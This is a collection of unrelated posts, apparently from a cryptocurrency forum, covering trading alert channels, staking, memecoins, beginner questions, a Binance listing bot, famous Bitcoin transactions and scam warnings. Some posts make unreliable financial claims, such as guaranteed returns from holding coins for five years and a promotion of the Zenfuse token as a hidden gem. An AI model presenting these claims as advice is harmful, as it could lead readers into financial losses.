I have some free channels free to use for getting instant notifications for price / RSI / MA changes (soon there will be volume change alerts too)

Here are them:

1- On Binance Futures pairs, send an alert notification when RSI value of 5m, 15m and 1h period (for both of them) goes over 70+ or goes below 25-:  channel username: BinanceRSIAlerts

2- Same of previous channel which is working only for 80+ and 20- RSI values: channel username: BinanceRSIAlertsAdv

3- On Binance Futures pairs, send an alert when price of coin changes at least %1 in last minute candle: channel username: bfpca1m1p

4- Same of previous channel which is working at least %2 change: channel username: bfpca1m2p

5- On Binance Futures pairs: send an alert when price of coin goes over in 5m, 15m and 1h periods MA21, M55 ve MA233 or down of these values (21, 55 and 233 is golden numbers of fibonacci): channel username: BinanceMAAlerts

I hope at least one of them will help on your trades..

PS: I'm not selling any VIP group or membership, both are them free for use for lifetime

So i decided to get into the crypto side of investing. I bought a little bit of the main big coins. But then I decided to throw $2 at shiba. I figured its just two dollars and i can afford to lose it if i have to. I was just experimenting around with the app and noticed that it said in order to sell Shiba i have to have 100,000 shares. So now i have a few questions based off of this. 

1) Why do I need 100,000 to sell?
2) Is there a minimum to sell on all coins and if so how do I find out that number?
3) What kind of fees do I have to pay to coinbase pro when i sell

And i guess while we are at it, any other information i should be aware of?

I have encountered this and it was really unpleasant. One of my crypto MOONed and I wanted to sell it but woop d doo. It was staked and I kept restaking my cryptos. (I use an exchange to stake my cryptos) 

I saw the rise in value and I had a hunch that there would be a dip afterwards, which did happen. However, all I could do was just watch as my cryptos were staked and locked on the exchange that I utilize. 

That was the moment I realized if I do plan to DCA out during the bull run I would need to unstake my cryptos or else this unfortunate event would come and bite me in the back yet again. 

I do not want anyone of you to go through that so do remember to unstake if you plan to sell and or DCA out. However, if you plan to HODL for years to come please ignore this post and diamond hand your portfolio.

Started investing in crypto this year thanks to this sub mostly. Only able to DCA like $50 per month and have been pretty much so little BTC/ETH/ADA in that order, so I dont have much, but at least Im green!

During this time Ive been trying to become more educated about how everything works and the real use cases. Im mostly a reddit lurker. I have no moons and not trying to farm them, but they got me thinking about blockchain technology applied to social media. 

Would you say the overall effect of moons is positive or negative in this sub? Clearly moons have gotten a lot more people posting and farming karma, for better or worse. 

If built ideally, how do you envision blockchain tech applied to social media? I could see it being cool to have immutability and traceability, but what other wins could the concept achieve?

Conversely, what about the worst case scenario? Some people seem to dislike moons effect of the subreddit. How bad could it get?

I always appreciate detailed tech answers too that can lead me down rabbit holes. Its all about learning!

Im so glad I staked my coins. I have ADHD and im really bad at impulse control. Even though whenever I think about taking out crypto to buy something stupid my reaction is disgust, when Im broke and I want something stupid it only takes about 2 minutes of stupidity to have my crypto being converted into fiat. School started up again Ive been chronically broke for a couple months now, buy now theres an asterisk above that broke*. Im broke with some money in crypto thats gonna be worth a lot more when I can touch it. And Im constantly adding small amounts in that I wont be able to touch. For me personally, I couldnt imagine a better option than losing access to my coins while Ill be broke and studying, then being able to do whatever I want with my coins in a few years once I (hopefully) have more money to buy stupid things with. It used to be that it only took 2 minutes of stupid impulsivity to lose my money, but now it only takes 2 minutes of rationality to lock myself into a great deal. I love it.

the point of democrats wanting to look into every account that has more than $600 of activity PER YEAR is crypto.  it has nothing to do with billionaires.  they already know who they are, besides, it would take tens of thousands of bank accounts for a billionaire to hide enough transactions to be meaningful.  


no, the reason is us and crypto and the fact that we average joe's have a real opportunity to make life changing money with not huge investments and they can't have that.  democrats exist only because they've convinced people to be dependent on them.  they steal your money and give back a little and tell you how lucky you are.  democrats also campaign on higher taxes because their base hates rich people - until they have the opportunity to become rich.  


most crypto users are left leaning and young - can you imagine if these people actually wised up and realized that they don't need democrats to succeed?  as their investment grows, they might actually not want democrats snooping every transaction and stealing half their money (biden wants to increase capital gains to 44%).  so, democrats are swooping in now to keep the average joe average and the poor poor so they can keep hustling the hate and stealing your money to give to themselves.  


this bill alone is enough to never vote for dems again.

Hey guys and gals, Ive just gotten into crypto in the last week after many years of sitting around watching. 
I know there would be a lot of posts about this, but for me and other newbies,  where do you guys go to do all your research, who do you recommend me watching, dos and donts. 

I currently have small amounts in ETH,BTC,SOL,DOT,ADA,XRP

From the little research Ive done I feel like these were safe to drop some small money into, just to see the movement and get a feel for it. 

Any advice is greatly appreciated!!

You know those people who slave away on machines that try to get rich off of $20. Its depressing. You know the odds are low for them to succeed but they keep going at it. This rise of memecoins has made me stray from the subreddit in recent months. Im not an elitist or blockchain purist, Im just a young investor who sees value in an immutable ledger. Seeing DOGE, then SHIB, then the Squidcoin thing all happen is difficult. Its not an inspiring movement, its taking advantage of desperate people. Its indulging in the worst parts of ourselves to make a profit, and whats worse the victims talk themselves out of being victims. If you bought into that squid coin, you got scammed. Its really that simple, and people indulging this new meta wave of pump and dump arent learning anything other than this is a casino. It isnt if youve done your research, compared data and fundamentals. Risks arent inherently gambles, regardless of what simple hype lovers try to reword. This is an investment, its your quality of life on the table.

This is all to say, I dont make many posts anymore because I realized it was all just for more moons, but I really wanted to write this out in hopes that one person sells their stash of shitty coins with value only tied to and idea of an idea. These wont last, and perhaps you werent there as 90% of the top 10 coins fell from grace as they will again. This is not financial advice, but just a friendly reminder that this isnt a new world or meta. It has always existed for as long as weve done business, and you will be another victim manipulated by misinformation and you will have no recourse. Good luck and be careful in this space.

Michael Saylor is obviously one the biggest Bitcoin bulls in existence, but still this is some pure grade hopium, be sure to not swim 30 minutes after reading or operate any heavy machinery.

Key points:
MicroStrategy CEO Michael Saylor said Monday that Bitcoin is "going up forever," although the cryptocurrency will likely continue to experience bouts of volatility.

"I think for the decade, Bitcoin is going to be the strongest, hardest, most technically forward store of value in the economy," he said.

Turning to other parts of the crypto market, Saylor said he sees a U.S. dollar stablecoin going to a market cap of $10T if regulators provide a transparent structure around it.

He added that the U.S. dollar would likely emerge as the world reserve digital currency.

Hey guys,

I'm kind of looking for the best crypto tracker.

Currently I have my crypto spread out over multiple exchanges and hardware wallets and it's just a pain in the ass doing the math all the time especially for coins that are being staked and aren't showing in my hardware wallet.

I'm kind of wondering what the best and safest crypto tracker is where I can put in all my assets or even link them if I have to.

Just having one place to go to that shows everything would be really convenient.

I know I was watching Bitboy crypto one time and he was showing his profile and he had something similar to this set up.

It was/is getting a lot of hype and I think people enjoy the quirky name. Some big influencers are backing it as well. I dont know why but I have a bad feeling about it.

I just saw they are coming out with a useless appI assume it will be an exchange as well. Anyone know anything more about this app and how it could affect the coin?

Am I missing something here are do you think my gut is correct. What are the utilities of the coin or is it just hype? Maybe if it had some unique utilities Id be more on board. I feel so torn, my gut says its gonna be no good, but it seems to be picking up momentum so the FOMO is real.

Looking for serious advice/research on the coin so I can keep trying to decide to invest. It also seems kinda uppity, like whales only. Is this true? What are yalls thoughts? Anyone already invested? Why should I Invest or not invest.

Right now is a tough time in the market as there are many good looking projects and I cant afford to get I all of them. Add that to the fact the market is diluted with crap coins and doing DD is a lot of work. So starting herewill useless live up to its name or it worthwhile?

I've used my gaming PC to mine some ETH at night when I pay only 0.07/kWh  
I managed to get around 250$ worth of ETH in 5 months and I'm wondering if I should sell now or wait for ETH2.0 to avoid the fees.  
I'm a big crypto noob and I just did that because I was curious of how much I could get back from my 3080.  


I've been told that changing my ETH to  would cost a lot of money in gas and I don't want to make a mistake.  
What should I do? That money won't change my life, it's not much.   
It's just that I don't like wasting and I don't want to wait too much to sell because I didn't actually make anything if I don't sell.  
Please somebody explain if you wanna spend the time.

I'm completely open to changing my mind, please try to do so in the comments.

1.The Tether ticking bomb is not exploding in the short term. Yes, tether is shaddy as hell (we can talk about the problems they have), yes they are iliquid, but as long as there is not a "bank rush" where everyone wants to convert USDT into dollars there is no problem, with very little cash banks are liquid too. Tether only had to make small interventions to push the value back to a dollar when it fell to 94 cents (yes, in the long term it will indeed explode)

Disclaimer: I don't hold any USDT nor encourage it's use

2.You can't time the market, but DCA everyday is not a perfect strategy. I have been to crypto since january. DCA on the way up from the bull run, cashed out at 56K because the analyst I follow showed his strategy showed the bull run was probably over. (I can make a post on the strategy with the graphs and indicators, explaining each). I didn't make a huge sum of money (like 100U$D) but that's like half a wage were I live. No, I couldn't sell the top, but at least I was liquid and now I could DCA as BTC fell to 30k, so I actually had more BTC that at the beggining.

So DCA on bear market is great. But consider taking profits at bull to buy cheaper when bears come.

3.A loss is NOT a loss only when you sell. You can hold a rugpull, a pointless project, a scam etc and it's price will never recover, most crypto projects have and will fail long term, this happens in every industry, something better, cheaper comes and flips you. Just as Bitcoin will/has flipped the dollar.

4.Leverage is a tool, it's neither good nor bad. I only used 1-2x leverage when I traded, sometimes 1.5 (using x2 and adding cash). My profits rose a little compared to when I didn't use leverage. Yes, using leverage above 10x seems suicidal for me, but there are scalpers who make money, so who knows. Most definitely for the average Joe this is not a good strategy.

Well, those are my unpopular opinions, please try to change my mind/convince me in the comments. Hope you all have a great monday!

Extra note: sorry for my english, please correct me if I have grammar mistakes so I can learn!

We may think we're living in a kind of global digital gold rush right now, but it will be even more lucrative for our children or grandchildren who will have the pleasure of finding all of our "vintage" seed phrases etched into a piece of metal in the foundation of a house, or discovering our ledgers/trezors/whatevers hidden under mattresses, or in drop ceilings, or buried in the backyard only to be found during a renovation... it will be pandemonium. 

While I certainly have plans to hodl several select coins until I can bequeath them directly to family, as I imagine many do, the thought of someone struggling or a young family finding my phrases hidden in my house and bettering their lives would be an excellent plan b.

Im new to crypto, I believe in the decentralisation aspects and the power to bypass corruption with this incredible tech to empower billions of everyday people around the globe buuuuut.

Theres a couple things that worry me about this space:

1. Crypto currencies gains enough traction that Governments get together at G20 or whatever and decide crypto currencies are undermining their fiat, declare them counterfeit currencies and crack down mercilessly in a combined effort to maintain centralised financial authority under nation states.

2. They declare crypto currency terrorist related assets and a threat to national security and use all the terrorism related laws to shut down all the CEXs and confiscate our crypto ( if you think you can hide from the securities agencies perhaps you better go read the Snowden leaks again, with the power and info they have they could stop tax evasion tomorrow its just a matter of priority of how their vast resources are used and what is declared a national security issue ) Even if your stuff is not on CEXs if they make all the transactions illegal it would destroy most of the space overnight, you might still have your crypto but it would now be worthless. 

3. The space becomes wholly dominated by big existing institutional wealth and without the regulation that stops them doing the most evil shit theyd like to do and cant because of gov regulation they are free to do all of it the crypto space ( DAO arent democratic at all its whoever have the most wealth get the most say which is the big problem we have with the existing traditional financial world ) 

4. Anonymous and private Crypto leads to tax evasion on a scale never before seen which starts to corrode the social contract and lead to governments taxing the little guy even more to make up for it 


Anyways these are just my thoughts, am I being too paranoid or are there worse things I havent even thought about.
Im not trying to be a downer I want to understand my risk profile a bit more before deciding how much of my retirement I should try and find through crypto.
Saying just dont put in money you cant afford to lose isnt an answer to any of this,  I feel like that is a head in the sand approach.

There is no need to tell anyone if you have made gains or how much money you have in your portfolio.

Why would they do that, what do you get with it?

First, you have the risk of someone you told that to go out and start telling other people about it. Therefore, someone may come tomorrow to threaten you, to try to get that money out of you.

Since I live in a small town, by tomorrow everyone would know how much money I made in cryptocurrencies.  

*"Could you borrow me some money, hey take us out to lunch now when you made money doing nothing,  take us out for a drink, why didn't you tell me to invest in that coin when you knew it was going to jump, hey* *you made money doing practically nothing.."*

Envy and jealousy are in human nature. 

People who dont understand cryptocurrencies have the impression that we put money here and thats it, we wait for the gains and end of the story. Ez money they think.

**I literally don't see a single reason why they would talk about the value of their portfolio to other people**, you will get absolutely nothing out of it.  Keep that secret to yourself. 

My friends think that I am a dumbass for doing this, do you really think that I will tell them about my gains? I am just going to let them think whatever they want, who cares honestly.

For me, Chainlink is the final missing piece. 

Which project would halt the operation of crypto space if it disappears in the blink of an eye? 

If we think inversely in terms of the utilities of the particular crypto 'in action now' then we see more close to its true value. 

Lets say hypothetically an alt-coin crypto project disappears in the blink of an eye. Which one will impact the crypto space most? (Lets not count Eth since its an obvious answer). I know other major platforms like ADA/SOL/ALGO/DOT/AVA/ATOM (Which I hold some of them) are all great projects with their strengths/weaknesses but for me, at the current proposition, they are still replaceable by Eth ecosystem + current layer 2 solutions and not having them tomorrow won't stop much of the operations in crypto space as a whole. This means the majority of crypto space will still function without them. I know this could spark controversy. But emotions aside and let's be cold-blooded as an investor. Unless you are in for the tech. 

So, Chainlink is my answer. Fundamental is strong as Chainlink act as a series of bridge's Gatekeeper between the physical (real) and digital world. The project is currently integrated (900+ Projects including most of the major platform players as I mentioned above) and Link is responsible for operating  80% of defi projects. So if Chainlink disappears in a blink of an eye, most of defi projects and many NFT projects will be on halt. I am sure there will be another oracle project to replace its place with time but that is not what I am trying to get to. I am trying to see a CURRENT value proposition in relation to other altcoins, not in 3 or 6 months time so we have a more objective and clear perspective without speculation(future) and hype.  

This reverse questioning of the basic value proposition will somewhat help us to find fundamentally strong long term investment in any crypto project. 

So, I will ask again. Which alt do you think will somewhat halt the operation of the crypto space if it disappears now?

Okay so be gentle with me beautiful people of reddit and r/cc, Im new round here 

Ill be the first to admit this could well be a bit far fetched but.walk with me for a moment my friend, indulge me this one hopium fuelled monologue. 

It appears, in my humble opinion, that we, humanity, thanks to a monumental inflection point dropkick from Satoshi Nakamoto (that very gift of Bitcoin itself being a result of the internet and collaboration) incentivised transparent information sharing and decentralisation which can only lead by hook or by crook to  improved understanding, advancement, collaboration, and (now that were heading towards our wealth being secure by computers and code rather than government, armies and blood) peace and prosperity (continuing the trend humanity has always taken of improving through social cohesion..if you zoom out enough on the timeline, of course).

It also seems interesting that this coincides with greater understanding  and focus in neural networks, advancements and conversations in a number of other exciting industries are seeming in my mind to coalesce around this idea (or at least inspire the thought) of some kind of decentralised networked hive mind-esque (in a none dystopian way) hyper intelligent form of humanity with the greatest ability to directed the will of all individuals towards improvement without compromising individual liberty.   We have the super computer capable of being all knowing (the internet ).and now we have the means and mental models to incentivise people, scientists, businesses and even governments to adopt, protect and improve it.

Im getting this strange feeling that the singularity (in some form) is coming sooner than we think (mobile a phone adoption, the internet, crypto adoptionwe live in the exponential age of networks it seems), likely with the first true ai actually being this hybrid symbiosis of world wide networked intelligence and computer processing power, digitally assisted in a feedback loop - essential allowing every human being in the world to truly tap into the intelligence of the rest of the world to apply to a given problem, and be incentivised to support and protect that network of intelligence and grow and improve.

My minds seems to be pulled to this notion of information being the key to everything. Life. To master and understand it is to understand and appreciate the properties of information. Information likes to spread, much like life. To propagate, and decentralise..much like the juxtaposition of the Big Bang to the current uttermost edge of the universe.makes you think

So, long story short when I first got into crypto about a year ago, I used an app called UNIPRO by Hextoys. When I first looked into it, it seemed legit and I thought it was associated with uniswap. Bought a few coins with it, connected just fine to my coin base wallet and the coins ended up there. 

Havent used it since then. Have just been using uniswap on my computer. Went back today to look around on it and now its no longer available. A quick search doesnt show much on it, a couple people saying its probably a scam on a previous Reddit post, and another article making it seem legit- but other than that, not much.

My coins are still in my wallet. Anyone know what the deal was with UNIPRO? Anything I should be worried about even though my coins are in my wallet and everything is seemingly fine?

https://www.smh.com.au/business/banking-and-finance/cba-makes-landmark-move-into-cryptocurrencies-20211103-p595j3.html

Commonwealth bank is the biggest bank in Australia. Seems like a very pro crypto move and a good sign of things to come regarding regulation in Aus.

Based on the article it sounds like its just a pilot program for now that will only be available to a select group of customers.

I'm wondering if some of the other big banks like ANZ etc will follow suit and introduce programs of their own out of fear of missing out on the added customers CBA would attract. 

I know a lot of people who are avid investors in stocks that are simply put off by having to sign up to a crypto exchange to get exposure to crypto. 

I wonder if this service would be part of their commsec trading app (stocks) or be a different app altogether similar to the commsec pocket app which is just used for select ETFs.

Thoughts for what this means for crypto in Australia?

I talk to people all the time in the crypto space who are trying to make sense of 1000 news articles and 1000 opinions from 1000 different people and drive themselves crazy trying to stay on top of 1000 different coins

The result?

Failure to stay on top of any. And a HUGE headache

Investing in most areas of crypto is the same as investing in anything (except some micro cap coins imo):

1. Is the currency producing anything?

No utility or minimal utility = more speculation based market caps = more risk (in most cases)

2. Is there a demand for what it produces?

You could be the best company at making perfect replicas of human sh*t but if no one wants it, youre not going to be in business very long 

3. Is it better than the competition 

Self explanatory 

4. (If its an upcoming project thats not fully released yet) does show valid signs of utility 

Its inherently more risky when investing in things that havent released, metaverse games being a prime example. Doesnt mean you cant make accurate estimations but they are just that, estimations and so risk management and diversification become more important to me

Thats why my two biggest very conservative holdings are ETH and DOT for example - incredible utility in both and similar, allowing me to get to know that market better than all the people trying to understand and stay on top of everything at once

My two cents, what do you think

Hi everyone,

I wanted to ask for some help and advice. My team and I started a crypto project which allows people to mine tokens while using their navigation app.

The idea is that advertisers buy ads in the form of NFTs which will be located on the road. The promotional NFTs which could be discount vouchers for your local burger place will be automatically sent to your wallet. This opens a whole new door to advertising.

Because it's mandatory for advertisers to buy the token to advertise, the price of the token will go up. Which goes directly to the miners.

We believe if you build the platform, you should get the rewards. Build by the community, for the community.

We the token, miner blueprint, website, and everything is ready, we are now looking for the first community to join us to improve the idea and build this together.

I didn't post the website here to avoid not being able to post but I will leave it in a comment.

Thank you so much for your help and please leave your thoughts.

So there are many reasons for why people want to participate in the new AR and VR Metaverse being talked about. 

-Escaping from reality: people can mentally distance themselves from their oftentimes sad and lonely lives and become someone cooler online. 

-Discovering new worlds: experiencing a new world of technology, a new way to experience reality. Far out man. 

-Interacting with adult content. Its been talked about for generations. Experiencing pr0n in a virtual reality context, where sensations become so convincing that one could mistake them for reality. Based on science and statistics, demand for nude and lewd content has never been higher. 

-So basically what Im asking is: would it be safe to assume that coins and tokens associated with the adult metaverse will soon be increasing in value substantially?

Hi r/cc, I've been a long time lurker on this sub (and for crypto in general). Only have like 50 bucks in ETH just for the sake of it BUT I'm finally confident in putting X amount of money into crypto every month. My current plan is to divide this into BTC, ETH and another random top 30 coin (that switches every month), with 50%-35%-15% respectively. Y'all think this is a solid strategy? Or should i keep the 3rd coin the same, or pick a way higher pool, with lower percentages? Maybe you have any tips for newbies like us. If so, lemme know please.

I had a pretty busy post yesterday. All the responses made me feel welcome and part of a great community that actually gives a shit. 

Except for a number of private messages. Although on the surface they seemed to really want to engage in a positive way, I could sense something was afoot. 

Maybe a handful of them were authentic individuals, just reaching out to weigh in on my post personally. That I did appreciate. 

Some of them seemed really clever in their antics to gain trust and drive the conversation towards something very scummy. 

All I am saying, is really watch it out there. If someone messages you, be weary. They werent using standard scammer tactics. These scammers have evolved, and they can smell blood. 

Just a thought. Stay safe and happy gains.

We see time and time again people who say things like, "Look at LRC go! Too bad I emptied my bag yesterday", "I too took great profits from SHIB, unfortunately it 300x'd right after". Countless examples of exiting too soon, and having sellers remorse.

My personal strategy of reducing the blow to the "Should Have, Could Have, Would Have" is to make sure I leave some dust/rocks into ANY coin I ever buy. For me, my bottom line is to never remove any more than 15% of my initial buy. Well, you might say "but I only bough $10 of this coin". And I will tell you until I am blue in the face that having SOME skin in the game is better than having NONE. 100's, 10's 1's, hell even pennies left into a coin you once purchased can add up.

Sellers remorse is absolutely real, and those emotions can haunt you. So, if for no other reason, leave a bit in that bag. The difference could offset a loss in another coin. It could also setup you up to re-enter a coin you once had. Maybe then setup a DCA for that bag.

The market moves fast, and if you're only playing for moonshots, than this obviously isn't for you. But if you're in the market for the long haul, 3/5/10+ years, this tip very well might feed a smaller target(s) you have, or compensate for other bags failure to grow.

Using this personal standard has helped me tremendously this year. Use it, adapt it, most importantly though is HAVE A PLAN. Any now of course, I am eager to hear what your personal standards are for how to exit a coin.

After a couple months of research, I decided to make a crypto trading algorithm that scans the Binance announcement page, and buys coins announced for listing on exchanges where this coin is currently tradeable.

The project picked up a lot of interest [recently](https://www.reddit.com/r/CryptoCurrency/comments/qc9zoe/finally_did_it_i_made_a_crypto_trading_bot_that/), and there have been some cool new updates to tool. During the testing of this tool, me and other people who have been using it noticed that Binance may be backdating their announcements by 5 minutes, potentially allowing them to make huge gains in before the rest of the market even finds out about the announcement. 

It's possible that may have just been a glitch, but it has happened once before.

The coin in question was Tranchess (CHESS). Due to this delay the bot did not make a profit on this.

So as a result of this, the trading bot now has detailed logging along a few other general improvements. With this logging, we'll be able to know for sure whether Binance is actually doing something shady on the announcement page.

&amp;#x200B;

So yeah, either the tool turns profitable or we call Binance out for insider trading lol. Currently waiting for a new listing announcement, will (hopefully) report back with some good news.

&amp;#x200B;

I have explained why this might constitute insider trading along with a more in-depth performance analysis of the recent order on YouTube if you're interested:  [https://youtu.be/H2ylujgbDzw](https://youtu.be/H2ylujgbDzw)

If you'd rather test the tool out yourself, here's a guide: [https://www.cryptomaton.org/2021/10/17/a-binance-and-gate-io-crypto-trading-bot-for-new-coin-announcements/](https://www.cryptomaton.org/2021/10/17/a-binance-and-gate-io-crypto-trading-bot-for-new-coin-announcements/)

Is there any downside to these? I havent read the fine print, but at first glance there seems to be no downside. No annual fees, staking bonus, 100% reimbursement ont netflix, prime, Spotify, discount for Airbnb, 8% back in crypto. I mean, just the streaming reimbursement seems worth it. Even for the obsidian, which has the most perks, theres no fees. So why are the lower cards even n option?

Can anyone who has one talk about the experience? Is there some sort of red tape to do the streaming platform reimbursement? Or weird hoops to jump through? Is there obscenely high interest?

I've been buying crypto on and off since 2014 when I first bought some bitcoin (unfortunately I sold a year later at a 50% loss) but I never expected to see the likes of DOGE and SHIBA take over the crypto scene.

My family members have never heard of Ethereum or Cardano, but they have definitely heard of the dog coins.

Does this signal close to end of cycle? The multiple xxx% gains in days for memecoins reminds me close to end of cycle in the 2017 bull run. 

I'd like to hear the communities thoughts on the matter. Have we entered a new normal or am I just an old boomer?

When a friend, partner, wife, your 2-year-old dog's veterinarian, they all start to talk about your Investments, and try to take some credit, you should know that, whatever you do, you're in the right way!

This might be your ETH investment, Dick NFTs, *Playing Crypto royale like a god.*\- But the point is once you start gaining some decent money on Crypto. People will soon try to take some credit, "like they supported you for all that time"!

And in moments like those- believe me, It's so damn fun to watch them desperately try to minimize what you do with jealousy in their face!

Stated by personal experience ;)

Stay safe, Love y'all!

Every time I see a topic on the front page talking about "Tell me about an under rated crypto" It's always the same ones we hear on a daily basis. ADA, ALGO, DOT BAT, MATIC, MANA, etc. You get it, every day I see a topic related about this with the exact same coins everytime, nothing that obscure. 

Today I'd like to discuss a real hidden gem that should be worth checking out. It's called Zenfuse. Zenfuse is being labeled as the ultimate trading platform with built-in connectivity to major exchanges, next-gen tools, analytics, portfolio management, and news aggregation. An all-in-one ecosystem that is further extendable. It is going to have some unique features that you won't find on any other crypto exchange. They recently partnered with Link, and have some other secret big partnerships on the way. The team is one of the best teams you will ever meet, all are humble and hard workers. 

The Zenfuse platform comes with it's own native Token called Zenfuse (ZEFU) that serves multiple functions which you can read about here. https://zenfuse.io/token

With a market cap of $4 mil and the platforms success, this should be the biggest hidden gem you can find. I think this should be on everyone's watch list, before it moons like crazy.

Nowadays whenever there is a new Crypto related article in one of the big Mainstream media outlets, it tends to be about some rug pull or "Crypto horror story" where somebody lost his life savings by buying Crypto. The latter probably applying the solid strategy of "Buying high and Selling low". 

These stories are creeping up alot, mostly negative and rarely something positive. While we all wanna have adoptation and the retail coming back in. 

Headlines like "Token loses all it's value in minutes leaving thousands of people with heartbroken losses" or "Greg lost his house and wife by buying Crypto". Are being posted daily. 

While Bitcoin holding strong above $ 60K and Ethereum breaking yet an another new ATH are not even mentioned. 

The Mainstream media is not showing the true Crypto world and like always not showing the real full story.

Hello crypto fans!  I was wondering if Coinbase ever advertises when a new crypto currency will be available on their platform?  Im sure Im not the only one who has noticed that any learn and earn tokens seem to skyrocket the moment theyre available on the learn and earns. 

For those who havent noticed, every crypto available for learn and earn jumps at least 40 to 50% on the first day and more after 24 hours. Every. Time.

And of course, Im hesitant to jump in quick and jump out quick and then miss an opportunity for some gains. So, from what my title says, is there a schedule or alert notifications for when an upcoming cryptocurrency will become available for learn and earn AND if there is, where can I sign up. 

To the moon my friends!

So, I'm pretty new to crypto and learning as I go but I believe I just made a frustrating mistake and all I want to know is if there's some way to fix it that I can't figure out. I bought $50 of USDT on Coinbase and sent it to Trust Wallet (which already had its own annoying fee), but what I didn't realize is that it was erc20. Now I'm stuck with $35 of ethereum network USDT in my Trust Wallet that costs more than its worth to send to, say, binance, to convert it into something I can use. It also costs a ton to swap it to anything else on the ethereum network. I didn't know at the time but I realize now that I actually wanted was something on the binance smart chain network, which I could use with Pancake Swap.

Anyway, is there anything I can do with this USDT or is it totally useless? At the very least I learned a lesson so there's that.

Hey guys! Long time lurker, only bought in about 2-3 weeks ago. Main coin in my bag is SOL, and with the tumultuous ups and and downs there was a point where I was down about $50, but I just trusted the process and woke up this morning to see +$15. I know it might seem like much but it really made me smile, I'm a student and don't have that much money but decided to trust the technology and hop in on what I think is the future of money! Thanks for all the great advice and open community, it really is great to be part of this revolution with you guys :-)))

Putting a small investment in a 5+ year coin will guarantee a positive returnperiod.

We are using Market cap as a measuring stick against a highly inflationary mark (USD). Because USD has always so inflationary (the govt considers negative inflation as a bad thing) you just cant go wrong.

The turmoil is people have a bad habit of fucking with their investment.

## Leave your Crypto alone! ##

Just fucking go for a walk.  The more you mess with it the more you are going to overthink it an walk away with nothing but a good story about how you almost got rich

I just came into a mid six figure amount of money thats been parked in a savings account doing fuck all for me for a few months. I want to spread it out over a few different asset classes.

BTC: I want to add to my position in BTC but buying in at ATH seems a bit foolish so thinking of DCAing over the next 6 months or so. Aiming for 20% of my portfolio to be in BTC.

ETH: Im not allocating anything to ETH, tell me why Im wrong. It seems like with the gas fees so high, and it being pretty inefficient until ETH 2.0 there are better investments.

Altcoins: DCAing 10% into several other coins, ADA, SOL, DOT, happy for thoughts on other things.

Blockfi, Celcius, Nexo Thinking of putting 50% of my portfolio into these lending platforms, at 9% stablecoin interest seems safe? 

Stock Market: 20% into mostly boring stuff and a few plays.

Tell me why Im an idiot and what I should be doing different!

These are pieces of history anyone can view, stored forever on the most secure network in the world. One of the coolest part about the blockchain being an open, decentralized and immutable ledger is that you can look back into the past at snapshots of very special moments. Here are some famous bitcoin addresses and transactions that involve turning points in the evolution of the currency, or are related to important people or events:

* [The Genesis Block](https://www.blockchain.com/btc/address/1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa) \- The first ever Bitcoin block, mined by Satoshi on Jan 9, 2009. Hundreds of Bitcoin enthusiasts continue to show their appreciation by transferring small amounts of BTC to the same address. As of Aug 19, 2020, there was a total of 68.33526331 BTC logged at the address.

* [Satoshi's only transaction](https://blockchain.info/de/address/12cbQLTFMXRnSzktFkuoG3eHoMeFtpTu3S) \- This, as far as we know, is the only known address Satoshi ever spent coins from and sent 10 BTC to Hal Finney.

* [The "Bitcoin Pizza" transaction](https://www.blockchain.com/btc/address/1XPTgDRhN8RFnzniWCddobD9iKZatrvH4) \- On May 22 every year, crypto enthusiasts all over the world celebrate the anniversary of Bitcoin Pizza Day by eating pizza? The trend began when Laszlo Hanyecz ordered and paid for two pizzas with 10,000 BTC. This was the first Bitcoin transaction in the real world.Based on the Aug 3, 2021 BTC value of approx. $38,000, that single pizza would be worth around $382 million!

* [Largest transaction ever](https://blockchain.info/de/tx/29a3efd3ef04f9153d47a990bd7b048a4b2d213daaa5fb8ed670fb85f13bdbcf) \- apparantly the single largest transaction ever (550,000 BTC)

* [Silk Road seized hot wallet coins](https://blockchain.info/address/1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX) \- The address of the seized hot wallet coins belonging to the users of the infamous Silk Road dark net marketplace.

* [Ross Ulbricht (DreadPirateRoberts) personal BTC stash](https://blockchain.info/address/1FfmbHfnpaZjKFvyi1okTjJJusN455paPH) \- The personal stash of the infamous Silk Road dark net marketplace founder Ross Ulbricht. Now seized by the FBI.

* [MT.GOX "proof of assets" transaction](https://blockchain.info/tx/3a1b9e330d32fef1ee42f8e86420d2be978bbe0dc5862f17da9027cf9e11f8c4) \- When bitcoin exchange Mt.Gox was struggling to stay afloat prior to their infamous collapse, then CEO Mark Karpeles wanted to prove that Mt.Gox was financially sound. To do so, he performed one of the biggest and most risky bitcoin transactions ever. The transaction was from Mt.Gox to Mt.Gox, but regardless it was sent over the bitcoin network to the tune of 442,000 bitcoins.

* [December 6, 2013: Bitcoin accepted as payment for Tesla Model S](https://www.newsday.com/classifieds/cars/bitcoin-used-for-tesla-model-s-purchase-at-lamborghini-dealership-1.6568853) \- According to a news report about Lamborghini Newport Beach car dealership in California, they sold a Tesla Model S electric car for 91.4 bitcoins, or $103,000 at the time of purchase. The transaction was handled by payment processor BitPay, said Cedric Davy, marketing director for the Costa Mesa, California based dealership. The dealership has never accepted bitcoin directly, but BitPays merchant processing service allowed the buyer to use bitcoin as a form of payment, [which was converted into USD](http://www.cnbc.com/2013/12/09/buying-a-tesla-with-bitcoin-not-so-fast.html) once the transaction was complete.

* [One of the richest entities](https://blockchain.info/de/tx/a289ea76bcc396412e90d63b90eb462ea2adb326aa027d5a1bb8864c7c152012) \- This transaction links 9 addresses each holding 66,000+ BTC that most definitely belong to the same entity (lets hope not a single person) and the 10th address in the blockchain with the same characteristics is likely part of that. This would imply that a single entity holds over 660,000 Bitcoins.

* [The U.S. Marshals Auction](https://blockchain.info/tx/9e95c3c3c96f57527cdc649550bf8e92892f7651f718d846033798aee333b0c3) \- When the online black market Silk Road was shut down, the U.S. government seized roughly 144,000 bitcoins. In what was a three-part auction, the [first auction of coins was sold](http://www.coindesk.com/us-marshals-one-auction-bidder-claimed-all-30000-silk-road-bitcoins/) to venture capitalist and entrepreneur Tim Draper which was for 30,000 bitcoins, worth $19 million USD at the time.

* [Very old Bitcoins](https://blockchain.info/address/1FeexV6bAHb8ybZjqQMjJrcCrHGW9sb6uF) \- This address holds almost 80,000 Bitcoins and has never been touched since the deposit in early 2011

Have I missed any important transactions? If you know any that I failed to mention please comment it on this thread! Hope you enjoy this little peak into history.

Ok. Ill be honest. I was always going to open my vault, but because I only use my laptop for Reddit, and that Im a huge procrastinator I didnt open my vault, but now I did. In the last day, but I did. Typical me. 

Thanks to everyone, who flooded my inbox and  asked me open my Vault. I love you guys! This is the community I like to be a part of.

